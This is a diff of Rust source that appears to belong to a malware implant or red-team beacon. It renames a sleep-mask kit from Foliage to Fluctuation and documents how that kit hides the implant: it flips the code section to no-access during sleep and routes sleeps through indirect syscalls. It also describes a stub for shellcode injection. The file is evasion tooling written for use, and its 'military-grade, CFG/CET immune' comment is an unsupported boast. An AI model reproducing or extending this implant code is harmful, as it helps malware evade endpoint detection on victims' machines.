@@ -3,7 +3,8 @@
 //! rewrites.
 //!
 //! Two kits today, both with behavior-preserving no-op defaults:
-//! - [`SleepmaskKit`] / [`NoMask`] — sleep obfuscation (Ekko/Foliage is P2).
+//! - [`SleepmaskKit`] / [`NoMask`] — sleep obfuscation (Fluctuation shipped;
+//!   an Ekko-class encrypting kit is P2).
 //! - [`ProcessInjectKit`] / [`NotImpl`] — spawn-to shellcode injection
 //!   (module stomping is P2).
 //!
@@ -21,11 +22,11 @@
 
 /// Sleep-obfuscation extension point. The default method is the current
 /// behavior (plain indirect-syscall sleep, no masking); an encrypting kit
-/// (Ekko/Foliage) overrides it.
+/// (Ekko-class) overrides it. The shipped impl is [`Fluctuation`].
 pub trait SleepmaskKit {
     /// Own the sleep window: mask the implant image + thread stacks, sleep
-    /// ~`seconds`, then FULLY unmask before returning. An Ekko/Foliage impl's
-    /// APC timer IS the sleep (it does not call a plain sleep internally), so
+    /// ~`seconds`, then FULLY unmask before returning. An APC-timer impl's
+    /// timer IS the sleep (it does not call a plain sleep internally), so
     /// the combined mask+sleep+unmask granularity is deliberate — do NOT split
     /// it into separate mask()/unmask() around an external sleep.
     ///
@@ -49,22 +50,24 @@ impl SleepmaskKit for NoMask {
 /// Fluctuation sleepmask kit: flips .text to PAGE_NOACCESS during sleep,
 /// then back to RX on wake. Military-grade — CFG/CET immune, no ROP chains,
 /// no RC4 key material. When disabled, falls through to plain NtDelayExecution.
-pub struct Foliage;
-impl SleepmaskKit for Foliage {
+pub struct Fluctuation;
+impl SleepmaskKit for Fluctuation {
     fn sleep_masked(&self, seconds: u32) {
         nyx_implant_evasion::fluctuation::sleep(seconds);
     }
 }
 
-/// The active sleepmask kit. Foliage masks the image at sleep when armed
-/// (ON by default via `foliage_enabled`); if disabled, it's NoMask-equivalent.
-const SLEEPMASK_KIT: Foliage = Foliage;
+/// The active sleepmask kit. Fluctuation masks the image at sleep when armed
+/// (ON by default; disarm via `NYX_FLUCTUATION_OFF` at build time or
+/// `fluctuation::set_enabled(false)` at runtime); if disabled, `kits::sleep`
+/// falls through to the plain floor sleep.
+const SLEEPMASK_KIT: Fluctuation = Fluctuation;
 
 /// Beacon-facing sleep entry. Routes through the configured kit so a future
 /// encrypting impl is a one-line kit swap, not a loop edit.
 ///
 /// # Fluctuation gating (sleep-mask wiring)
-/// Engages the Foliage fluctuation sleep-mask ONLY when BOTH:
+/// Engages the Fluctuation sleep-mask ONLY when BOTH:
 ///   (a) the full evasion init ran (`beacon::evasion_active()`) — so `mem::mask`
 ///       has registered the .text/config/key regions the thunk will flip, AND
 ///   (b) `fluctuation::enabled()` is true (compile-time `NYX_FLUCTUATION_OFF`
